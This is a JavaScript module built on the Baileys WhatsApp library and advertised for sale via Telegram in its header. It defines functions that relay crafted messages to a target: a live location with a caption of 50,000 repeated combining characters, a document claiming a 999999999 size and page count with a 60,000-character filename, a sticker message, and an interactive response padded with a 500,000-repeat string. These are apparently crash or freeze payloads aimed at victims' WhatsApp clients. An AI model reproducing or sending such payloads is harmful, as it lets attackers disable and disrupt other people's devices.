/*

Creator & Dev: Azrefta & Evelyn
Buy? 
 - t.me/Azrefta
 - 6285179993021

*/// Jangan di edit! 

const {
    default: makeWASocket,
    makeWALegacySocket,
    BufferJSON,
    Browsers,
    initInMemoryKeyStore,
    extractMessageContent,
    makeInMemoryStore,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    getBinaryNodeChild,
    jidDecode,
    runtime,
    areJidsSameUser,
    generateWAMessage,
    generateForwardMessageContent,
    generateWAMessageContent, 
    generateWAMessageFromContent,
    WAMessageStubType,
    getContentType,
    relayMessage,
    WA_DEFAULT_EPHEMERAL
} = require("@whiskeysockets/baileys")

const v8TwinTurbo = () => ({
      key: {
        remoteJid: "JAWA",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"evelyn@azrefta.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Neru\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    });

    async function EStar5(conn, jid, quoted) {
      var vGenerateWAMessageFromContent5 = generateWAMessageFromContent(jid, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "x",
              degreesLongitude: "ev [⃟༑YυɱҽΜιȥυƙι 𝐕 𝟐.𝟓 🍘ཀ͜͡ 𝐕.𝐕 𝟐.𝟓 温泉♨️",
              caption: "[⃟༑YυɱҽΜιȥυƙι 𝐕.𝟐.𝟓ཀ͜͡.xp" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: jid,
        quoted: quoted
      });
      await conn.relayMessage(jid, vGenerateWAMessageFromContent5.message, {
        participant: {
          jid
        },
        messageId: vGenerateWAMessageFromContent5.key.id
      });
    }
    
    async function Evelyn(conn, jid, quoted) {
      var vGenerateWAMessageFromContent6 = generateWAMessageFromContent(jid, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "Lonely",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "ϜυɱҽΜιȥυƙι 𝑣 𝟐.𝟓 🍰𝑪𝒓𝒂𝒔𝑿╳.xp" + "ྦྷ".repeat(60000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: jid,
        quoted
      });
      await conn.relayMessage(jid, vGenerateWAMessageFromContent6.message, {
        participant: {
          jid
        },
        messageId: vGenerateWAMessageFromContent6.key.id
      });
    }
    
    async function Lyan3(conn, jid, quoted) {
      var vGenerateWAMessageFromContent3 = generateWAMessageFromContent(jid, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: jid,
        quoted
      });
      await conn.relayMessage(jid, vGenerateWAMessageFromContent3.message, {
        participant: {
          jid
        },
        messageId: vGenerateWAMessageFromContent3.key.id
      });
    }
    
    module.exports = { Evelyn, EStar5, Lyan3, v8TwinTurbo };
    
    let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file);
	console.log(`\x1b[41m\x1b[97m ⓘ Reloading ${__filename}! \x1b[0m`);
	delete require.cache[file];
	require(file);
});